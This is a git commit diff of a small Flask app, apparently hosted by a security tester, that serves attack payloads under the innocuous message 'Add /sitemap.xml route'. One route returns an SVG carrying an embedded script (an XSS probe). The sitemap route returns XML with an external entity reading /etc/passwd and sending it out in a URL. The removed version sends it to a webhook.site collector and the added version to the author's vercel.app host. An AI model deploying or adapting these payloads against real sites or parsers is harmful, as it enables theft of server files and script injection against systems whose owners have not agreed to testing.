95cd33a922554b945aa192aed318cc6678502ea7
w41bu1 <buivanyk4@gmail.com>
2025-09-29 01:08:04 +0700

    Add /sitemap.xml route

--- api/index.py
+++ api/index.py
@@ -1,38 +1,33 @@
 from flask import Flask, Response
-from fastapi import FastAPI
-from starlette.middleware.wsgi import WSGIMiddleware
-from fastapi.responses import Response as FastResponse
+import textwrap
 
-flask_app = Flask(__name__)
+app = Flask(__name__)
 
-@flask_app.route("/")
+@app.route('/')
 def home():
-    return "Hello, World!"
+    return 'Hello, World!'
 
-@flask_app.route("/svg")
-def svg():
-    svg_content = """<?xml version="1.0" encoding="UTF-8"?>
-<svg xmlns="http://www.w3.org/2000/svg">
-    <script>alert(document.domain)</script>
-</svg>"""
-    return Response(svg_content, mimetype="image/svg+xml")
+@app.route('/svg')
+def about():
+    svg = """<?xml version="1.0" encoding="UTF-8"?>
+    <svg xmlns="http://www.w3.org/2000/svg">
+        <script>alert(document.domain)</script>
+    </svg>"""
+    return Response(svg, mimetype="image/svg+xml")
 
-app = FastAPI()
-app.mount("/", WSGIMiddleware(flask_app))
-
-@app.get("/sitemap.xml")
+@app.route("/sitemap.xml")
 def sitemap():
     xml_content = """<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE urlset [
-    <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
-    <url>
-        <loc>https://webhook.site/371086e9-abd3-4e87-bf64-01031f74dc96/?abc=&xxe;</loc>
-        <lastmod>2025-07-30</lastmod>
-        <changefreq>daily</changefreq>
-        <priority>1.0</priority>
-    </url>
-</urlset>
-"""
-    return FastResponse(content=xml_content, media_type="application/xml")
+    <!DOCTYPE urlset [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    ]>
+    <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
+        <url>
+            <loc>https://w41test.vercel.app/?=&xxe;</loc>
+            <lastmod>2025-07-30</lastmod>
+            <changefreq>daily</changefreq>
+            <priority>1.0</priority>
+        </url>
+    </urlset>
+    """
+    return Response(xml_content, mimetype="application/xml")
